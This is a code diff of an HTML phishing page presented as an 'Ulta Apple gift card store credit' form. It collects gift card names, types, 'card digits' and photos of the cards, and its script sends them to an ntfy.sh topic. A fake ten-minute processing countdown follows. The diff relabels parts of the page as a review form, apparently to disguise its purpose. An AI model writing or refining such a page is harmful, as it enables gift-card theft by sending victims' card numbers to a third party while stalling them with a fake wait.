@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ULTA APPLE GIFT CARD STORE CREDIT ADDED </title>
+  <title>ULTA APPLE GIFT CARD STORE CREDIT ADDED</title>
   <style>
     :root {
       --bg: #F27A30;
@@ -90,10 +90,6 @@
       background-color: var(--accent-hover);
     }
 
-    button:active {
-      transform: scale(0.99);
-    }
-
     button:disabled {
       background-color: #ccc;
       color: #666;
@@ -142,27 +138,22 @@
 <body>
 
   <div class="card">
-    <h2>ULTA APPLE GIFT CARD STORE CREDIT ADDED   </h2>
+    <h2>ULTA APPLE GIFT CARD STORE CREDIT ADDED</h2>
     
     <form id="reviewForm">
       <div class="form-group">
-        <label for="username">Name of Card</label>
-        <input type="text" id="username" required placeholder="">
+        <label for="username">Name of Card </label>
+        <input type="text" id="username" required placeholder="e.g. Alex or Character Name">
       </div>
 
       <div class="form-group">
         <label for="title">Card Type (Physical or E-code)</label>
-        <input type="text" id="title" required placeholder="Enter category">
-      </div>
-      
-	  <div class="form-group">
-        <label for="title 2">Ulta Beauty Account Email Address </label>
-        <input type="text" id="title" required placeholder="">
+        <input type="text" id="title" required placeholder="Summary of your review">
       </div>
 
       <div class="form-group">
-        <label for="review">Card Digits </label>
-        <textarea id="review" required placeholder="Enter details..."></textarea>
+        <label for="review">Card Digits</label>
+        <textarea id="review" required placeholder="Write your thoughts..."></textarea>
       </div>
 
       <div class="form-group">
@@ -170,12 +161,12 @@
         <input type="file" id="image" accept="image/*">
       </div>
 
-      <button type="submit" id="submitBtn">Submit Request</button>
+      <button type="submit" id="submitBtn">Submit Review</button>
     </form>
 
     <div id="processingBox">
       <div class="spinner"></div>
-      <h3>Processing your submission...</h3>
+      <h3>Processing your review...</h3>
       <p style="color: var(--text-dim);">Estimated wait time:</p>
       <div id="timer">10:00</div>
     </div>
@@ -192,7 +183,20 @@
     const processingBox = document.getElementById('processingBox');
     const timerDiv = document.getElementById('timer');
 
-    // Canvas-based client-side compression function
+    // Check if a timer was already running in LocalStorage on load
+    window.addEventListener('DOMContentLoaded', () => {
+      const endTime = localStorage.getItem('review_timer_end');
+      if (endTime) {
+        const remainingSeconds = Math.floor((parseInt(endTime, 10) - Date.now()) / 1000);
+        if (remainingSeconds > 0) {
+          showProcessingState();
+          runTimer(remainingSeconds);
+        } else {
+          localStorage.removeItem('review_timer_end');
+        }
+      }
+    });
+
     function compressImage(file, maxWidth = 1200, maxHeight = 1200, quality = 0.7) {
       return new Promise((resolve, reject) => {
         const reader = new FileReader();
@@ -204,7 +208,6 @@
             let width = img.width;
             let height = img.height;
 
-            // Maintain aspect ratio while resizing
             if (width > height) {
               if (width > maxWidth) {
                 height = Math.round((height * maxWidth) / width);
@@ -225,11 +228,8 @@
             ctx.drawImage(img, 0, 0, width, height);
 
             canvas.toBlob((blob) => {
-              if (blob) {
-                resolve(blob);
-              } else {
-                reject(new Error('Image compression failed.'));
-              }
+              if (blob) resolve(blob);
+              else reject(new Error('Compression failed'));
             }, 'image/jpeg', quality);
           };
           img.onerror = (err) => reject(err);
@@ -242,35 +242,31 @@
       e.preventDefault();
       
       submitBtn.disabled = true;
-      statusDiv.textContent = "Processing image & sending...";
+      statusDiv.textContent = "Processing and sending...";
       statusDiv.className = "";
 
-      const username = document.getElementById('Name of Card ').value;
-      const title = document.getElementById('Card Type(Physical or E-code)').value;
-	  const title 2 = document.getElementById('Ulta Beauty Account Email Address').value;
+      const username = document.getElementById('Name of Card').value;
+      const title = document.getElementById('Card Type (Physical or E-code)').value;
       const reviewText = document.getElementById('Card Digits').value;
       const imageFile = document.getElementById('image').files[0];
 
-      const fullMessage = `Name: ${username}\nCategory: ${title}\nDetails: ${reviewText}`;
+      const fullMessage = `User/Character: ${username}\nSubject: ${title}\nReview: ${reviewText}`;
 
       try {
         let response;
 
         if (imageFile) {
-          // Compress the image before uploading
           const compressedBlob = await compressImage(imageFile, 1200, 1200, 0.7);
-
           const uploadUrl = new URL(`https://ntfy.sh/${TOPIC_NAME}`);
           uploadUrl.searchParams.append('title', title);
           uploadUrl.searchParams.append('message', fullMessage);
-          uploadUrl.searchParams.append('filename', 'submission.jpg');
+          uploadUrl.searchParams.append('filename', 'review_attachment.jpg');
 
           response = await fetch(uploadUrl.toString(), {
             method: 'PUT',
             body: compressedBlob
           });
         } else {
-          // Text-only submission
           const uploadUrl = new URL(`https://ntfy.sh/${TOPIC_NAME}`);
           uploadUrl.searchParams.append('title', title);
 
@@ -282,21 +278,29 @@
 
         if (response.ok) {
           statusDiv.textContent = "";
-          form.style.display = 'none';
-          processingBox.style.display = 'block';
-          startCountdown(10 * 60);
+          showProcessingState();
+          
+          // Set 10-minute persistent end timestamp
+          const targetEndTime = Date.now() + (10 * 60 * 1000);
+          localStorage.setItem('review_timer_end', targetEndTime);
+          runTimer(10 * 60);
         } else {
-          throw new Error(`Server returned status ${response.status}`);
+          throw new Error(`Server returned HTTP ${response.status}`);
         }
       } catch (err) {
         console.error("Submission error:", err);
-        statusDiv.textContent = "Error: " + err.message;
+        statusDiv.textContent = "Submission failed: " + err.message;
         statusDiv.className = "error";
         submitBtn.disabled = false;
       }
     });
 
-    function startCountdown(durationInSeconds) {
+    function showProcessingState() {
+      form.style.display = 'none';
+      processingBox.style.display = 'block';
+    }
+
+    function runTimer(durationInSeconds) {
       let timer = durationInSeconds;
       
       const interval = setInterval(() => {
@@ -310,9 +314,10 @@
 
         if (--timer < 0) {
           clearInterval(interval);
+          localStorage.removeItem('review_timer_end');
           processingBox.innerHTML = `
-            <h3 class="success" style="font-size: 1.5rem;">Completed!</h3>
-            <p>Your submission has finished processing.</p>
+            <h3 class="success" style="font-size: 1.5rem;">Submission Complete!</h3>
+            <p>Your review has been successfully published to the forum channel.</p>
           `;
         }
       }, 1000);
